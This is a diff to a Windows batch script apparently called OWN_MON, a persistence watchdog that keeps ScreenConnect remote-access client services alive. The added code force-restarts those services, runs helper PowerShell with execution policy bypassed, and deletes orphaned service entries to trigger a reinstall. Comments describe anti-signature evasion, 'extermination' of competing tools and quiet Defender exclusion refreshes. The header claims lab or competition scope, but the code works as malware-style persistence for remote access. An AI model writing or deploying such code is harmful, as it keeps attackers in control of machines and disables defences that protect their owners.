@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M15
+rem  OWN_MON  BUILD 20260802M16
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -31,7 +31,7 @@ set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M15"
+set "MONVER=M16"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -137,8 +137,32 @@ if not errorlevel 1 set "ALT_OK=1"
 if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
   echo svc heal restart>>"%LOG%"
   net start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+  sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+  timeout /t 6 /nobreak >nul
   sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
   if not errorlevel 1 set "PRIM_OK=1"
+)
+rem M16: still stopped -> repair the REGISTERED product (msiexec /fa restores
+rem binaries + starts the service; L5 Repair-SCService handles stopped svcs)
+if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
+  echo svc escalate repair>>"%LOG%"
+  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+  timeout /t 8 /nobreak >nul
+  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 set "PRIM_OK=1"
+)
+rem M16: orphaned service entry (product unregistered - eaten by an SC-family
+rem upgrade removal) can NEVER start. Delete it and fall through to the
+rem fresh-install ladder below instead of alerting "wont start" forever.
+if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
+  set "REGSTATE=unknown"
+  if exist "%WD%\own_lib.ps1" for /f "delims=" %%R in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"') do set "REGSTATE=%%R"
+  echo orphan_check=!REGSTATE!>>"%LOG%"
+  if /I "!REGSTATE!"=="no" (
+    echo orphan_service_delete>>"%LOG%"
+    sc delete "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+    set "INSTALLED=0"
+  )
 )
 if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "svc-wont-start" >nul 2>&1
@@ -181,6 +205,19 @@ if "%INSTALLED%"=="0" (
 )
 
 :AfterHeal
+rem M16: ALT present-but-stopped -> restart, then repair-by-GUID (every tick)
+sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
+if not errorlevel 1 (
+  sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
+  if errorlevel 1 (
+    echo alt stopped - restart/repair>>"%LOG%"
+    net start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
+    sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
+    timeout /t 5 /nobreak >nul
+    sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
+    if errorlevel 1 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+  )
+)
 rem (extermination already ran pre-heal in [E]; foreign survivors counted there)
 
 rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
